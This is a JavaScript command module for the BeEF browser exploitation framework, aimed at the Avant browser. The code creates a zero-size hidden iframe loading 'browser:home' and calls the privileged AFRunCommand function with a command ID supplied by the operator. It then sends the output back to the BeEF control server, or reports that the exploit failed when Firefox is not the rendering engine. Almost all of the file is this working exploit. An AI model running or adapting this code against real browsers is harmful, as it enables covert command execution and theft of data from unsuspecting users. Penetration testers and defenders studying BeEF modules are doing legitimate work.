//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	

	var avant_iframe = document.createElement("iframe");
	//var avant_iframe = beef.dom.createInvisibleIframe();
	avant_iframe.setAttribute('src', "browser:home");
	avant_iframe.setAttribute('name','test2');
	avant_iframe.setAttribute('width','0');
	avant_iframe.setAttribute('heigth','0');
	avant_iframe.setAttribute('scrolling','no');

	document.body.appendChild(avant_iframe);

	var vstr = {value: ""};

	if(window['test2'].navigator) {
	//This works if FF is the rendering engine
	window['test2'].navigator.AFRunCommand(<%= @cId %>, vstr);
	beef.net.send("<%= @command_url %>", <%= @command_id %>, vstr.value);

	}
	else {
	// this works if Chrome is the rendering engine
	//window['test2'].AFRunCommand(60003, vstr);
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "Exploit failed. Rendering engine is not set to Firefox");	

	}
	

	

	

});

